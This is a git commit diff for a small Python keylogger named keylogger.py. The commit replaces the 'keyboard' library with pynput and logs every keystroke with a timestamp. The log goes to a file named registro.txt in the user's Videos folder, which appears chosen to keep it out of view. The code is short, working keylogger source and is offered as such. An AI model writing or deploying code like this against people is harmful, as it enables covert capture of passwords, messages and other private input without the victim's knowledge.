6c3c64e01918bc56b5477c433662f98ea5317e61
VicenteFc <61364069+vicentefc@users.noreply.github.com>
2025-07-10 22:43:46 -0400

    keylogger.py

--- keylogger.py.py
+++ keylogger.py.py
@@ -1,17 +1,18 @@
-import keyboard
+from pynput import keyboard
+from datetime import datetime
 import os
-import datetime
 
-current_dir = os.path.dirname(os.path.abspath(__file__))
+ruta_archivo = os.path.expanduser("~/Videos/registro.txt")
 
-log_file = os.path.join(current_dir, "keylog.txt")
+def guardar_tecla(key):
+    try:
+        tecla = key.char
+    except AttributeError:
+        tecla = str(key)
+    fecha_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    linea = f"[{fecha_hora}] {tecla}\n"
+    with open(ruta_archivo, "a") as archivo:
+        archivo.write(linea)
 
-def log_keystroke(event):
-    key = event.name
-    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    with open(log_file, "a") as f:
-        f.write(f"{now}: {key}\n")
-
-keyboard.on_press(log_keystroke)
-
-keyboard.wait()
+with keyboard.Listener(on_press=guardar_tecla) as listener:
+    listener.join()
